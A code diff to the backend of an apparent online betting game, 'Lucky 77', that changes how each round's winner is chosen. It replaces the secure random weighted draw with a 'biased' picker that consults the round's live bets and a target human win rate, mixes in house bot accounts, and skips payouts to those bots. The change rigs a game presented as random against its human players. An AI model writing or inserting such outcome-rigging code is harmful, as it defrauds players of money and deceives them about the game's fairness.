@@ -13,13 +13,18 @@ import type { WalletBalanceUpdatedPayload } from '@/modules/wallet/wallet.types'
 import {
   LUCKY_77_GAME_CODE,
   LUCKY_77_RNG_ALGORITHM_VERSION,
+  LUCKY_77_RNG_ALGORITHM_VERSION_BIASED,
   LUCKY_77_SLOT_MAP,
   LUCKY_77_SOCKET_ROOM,
 } from '@/modules/lucky-77/lucky-77.constant';
-import { calculatePayout, pickUniformSlotIndex, pickWeightedOption, slotIndexesForOption, withSerializableRetry } from '@/modules/lucky-77/lucky-77.utils';
+import { calculatePayout, pickUniformSlotIndex, slotIndexesForOption, withSerializableRetry } from '@/modules/lucky-77/lucky-77.utils';
 import { secureRandomBigIntBelow } from '@/utils/crypto-rng';
 import { sha256 } from '@/utils/hash';
 import { logger } from '@/utils/logger';
+import { pickBiasedWinner, pickNaturalWinner } from '@/modules/game-bot/biased-outcome';
+import { loadLucky77RoundBets } from '@/modules/game-bot/biased-round';
+import { getGameBotPolicy } from '@/modules/game-bot/bot-policy';
+import { isBotUserIdSync } from '@/modules/game-bot/bot-identity';
 
 const SETTLEMENT_BATCH_USERS = 50;
 const REFUND_BATCH_USERS = 50;
@@ -205,11 +210,17 @@ const generateResult = async (round_id: string): Promise<void> => {
   }
 
   const options = round.config_version.options;
-  const total_weight = options.reduce((sum, item) => sum + item.probability_weight, 0n);
-  if (total_weight <= 0n) throw new Error('Lucky 77 config has no positive probability weight');
-
-  const option_random = secureRandomBigIntBelow(total_weight);
-  const winner = pickWeightedOption(options, option_random.value);
+  const policy = await getGameBotPolicy();
+  const round_bets = await loadLucky77RoundBets(round.id);
+  const biased = policy.enabled
+    ? pickBiasedWinner({
+        options,
+        bets: round_bets,
+        target_human_win_rate: policy.target_human_win_rate,
+        min_human_bets_before_bias: policy.min_human_bets_before_bias,
+      })
+    : pickNaturalWinner(options);
+  const winner = options.find((option) => option.id === biased.option_id) ?? options[options.length - 1];
   if (!winner) throw new Error('Lucky 77 result winner could not be selected');
 
   const matching_slots = slotIndexesForOption(winner.code);
@@ -220,15 +231,19 @@ const generateResult = async (round_id: string): Promise<void> => {
   const winning_slot_index = pickUniformSlotIndex(winner.code, slot_random.value);
 
   const generated_at = database_now;
+  const algorithm_version =
+    biased.algorithm_suffix === 'biased-v1'
+      ? LUCKY_77_RNG_ALGORITHM_VERSION_BIASED
+      : LUCKY_77_RNG_ALGORITHM_VERSION;
   const entropy_digest = sha256(
-    [option_random.entropy_digest, slot_random.entropy_digest].join('|'),
+    [biased.entropy_digest, slot_random.entropy_digest].join('|'),
   );
   const audit_hash = sha256([
     round.id,
     round.config_version_id,
     winner.id,
     String(winning_slot_index),
-    LUCKY_77_RNG_ALGORITHM_VERSION,
+    algorithm_version,
     entropy_digest,
     generated_at.toISOString(),
   ].join('|'));
@@ -242,7 +257,7 @@ const generateResult = async (round_id: string): Promise<void> => {
         round_id: round.id,
         winning_option_version_id: winner.id,
         winning_slot_index,
-        algorithm_version: LUCKY_77_RNG_ALGORITHM_VERSION,
+        algorithm_version,
         config_version_id: round.config_version_id,
         entropy_digest,
         audit_hash,
@@ -403,7 +418,7 @@ const settleUser = async (round_id: string, user_id: string): Promise<void> => {
 
     await tx.lucky77BetSettlement.createMany({ data: settlement_rows, skipDuplicates: true });
 
-    if (total_payout > 0n) {
+    if (total_payout > 0n && !isBotUserIdSync(user_id)) {
       const existing_payout = await tx.lucky77UserPayout.findUnique({
         where: { round_id_user_id: { round_id, user_id } },
       });
